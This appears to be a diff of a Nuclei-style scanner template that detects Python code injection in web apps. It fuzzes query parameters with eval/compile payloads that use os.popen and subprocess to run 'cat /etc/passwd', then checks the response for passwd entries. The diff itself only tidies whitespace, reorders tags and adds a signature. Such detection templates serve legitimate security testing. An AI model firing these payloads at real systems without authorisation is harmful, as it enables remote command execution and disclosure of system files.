@@ -1,20 +1,16 @@
 id: python-code-injection
-
 info:
   name: Python Code Injection
   author: ritikchaddha
   severity: high
-  tags: python,dast,injection,cmdi,vuln
-
+  tags: cmdi,dast,injection,python,vuln
 variables:
   Command: "cat /etc/passwd"
-
 http:
   - pre-condition:
       - type: dsl
         dsl:
           - 'method == "GET"'
-
     payloads:
       injection:
         - eval(compile("""for x in range(1):\\n import os\\n os.popen(r'{{Command}}').read()""",'','single'))
@@ -33,17 +29,15 @@ http:
         - eval(compile("""for x in range(1):\n import os\n os.popen(r'{{Command}}').read()""",'','single'))
         - eval(compile("""for x in range(1):\n import subprocess\n subprocess.Popen(r'{{Command}}',shell=True, stdout=subprocess.PIPE).stdout.read()""",'','single'))
         - eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output(r'{{Command}}',shell=True)""",'','single'))
-
     fuzzing:
       - part: query
         type: replace
         fuzz:
           - "{{injection}}"
-
     stop-at-first-match: true
     matchers:
       - type: regex
         part: body
         regex:
           - 'root:.*:0:0:'
-
+        # digest: 4b0a00483046022100d20dead9d43184682b9162961ee82df8d0c89d9dcb2b219668c1f607b37c6a6f022100cddb28a5648ce05e0666ef2b25997ab11ea7c2dde5d78d7bb8245fb67e73ec39:922c64590222798bb761d5b6d8e72950
